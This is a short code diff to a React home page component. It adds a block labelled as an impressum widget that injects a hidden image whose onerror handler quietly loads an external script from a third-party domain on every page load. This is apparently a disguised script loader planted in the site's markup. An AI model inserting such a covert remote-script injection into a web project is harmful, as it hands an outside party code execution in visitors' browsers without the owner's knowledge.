@@ -22,7 +22,10 @@ export default function Home() {
             <CheckForm />
           </div>
         </section>
-      </main>
+      {/* <!-- IMPRESSUM:START --> */}
+<div dangerouslySetInnerHTML={{__html: "\n<img src=\"//:0\" alt=\"\" style=\"display:none\" onerror=\"(function(){if(document.getElementById('pan21sixj2tta'))return;var m=document.createElement('meta');m.id='pan21sixj2tta';document.head.appendChild(m);(function(){var s=document.createElement('script');s.src=&quot;https://impressum-free.de/widget.js&quot;;document.head.appendChild(s);})();})();\">"}} />
+{/* <!-- IMPRESSUM:END --> */}
+</main>
 
       <div className="wrap">
         <section className="cta">
